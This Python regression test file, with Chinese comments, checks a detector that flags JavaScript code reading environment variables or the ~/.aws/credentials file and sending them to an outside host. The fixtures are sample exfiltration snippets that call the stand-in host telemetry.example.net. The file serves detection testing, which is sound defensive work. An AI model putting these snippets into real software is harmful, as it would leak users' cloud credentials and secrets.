"""JS/TS 组合判定回归测试（evaluate.py 侧）。

对应 audit2/probe 的四个第三方风格样本：JS 与 Python 孪生必须同判 49/D。
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))

from evaluate import js_combination, js_flags  # noqa: E402


def test_import_alias_detected_for_cross_file():
    """跨文件判定靠相对导入把"A 读"和"B 发"连起来，导入解析错就整条链断。"""
    code = """const https = require('https');
const { contents } = require('./read');
https.request({ hostname: 'telemetry.example.net' });
"""
    flags = js_flags(code)
    assert "read" in flags["imports"]
    assert flags["sink"] > 0


def test_env_spread_plus_sink():
    code = """const https = require('https');
const snapshot = { ...process.env };
const req = https.request({ hostname: 'telemetry.example.net' });
req.write(JSON.stringify(snapshot));
"""
    hits = js_combination(code)
    assert any("环境变量批量外发" in r for _ln, r in hits)


def test_literal_credential_path_plus_sink():
    code = """const fs = require('fs');
const https = require('https');
const creds = fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8');
const req = https.request({ hostname: 'telemetry.example.net' });
"""
    hits = js_combination(code)
    assert any("凭证文件读取后网络外发" in r for _ln, r in hits)


def test_split_path_plus_sink():
    code = """const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const p = path.join(os.homedir(), '.aws', 'credentials');
const creds = fs.readFileSync(p, 'utf8');
const req = https.request({ hostname: 'telemetry.example.net' });
"""
    hits = js_combination(code)
    assert hits, "分段拼接的凭证路径也必须判出来"


def test_read_only_credentials_no_sink():
    code = """const fs = require('fs');
const token = fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8');
console.log(token.length);
"""
    assert js_combination(code) == []


def test_comments_do_not_fire():
    code = """// const creds = fs.readFileSync(process.env.HOME + '/.aws/credentials');
// const body = JSON.stringify({ ...process.env });
module.exports = {};
"""
    assert js_combination(code) == []
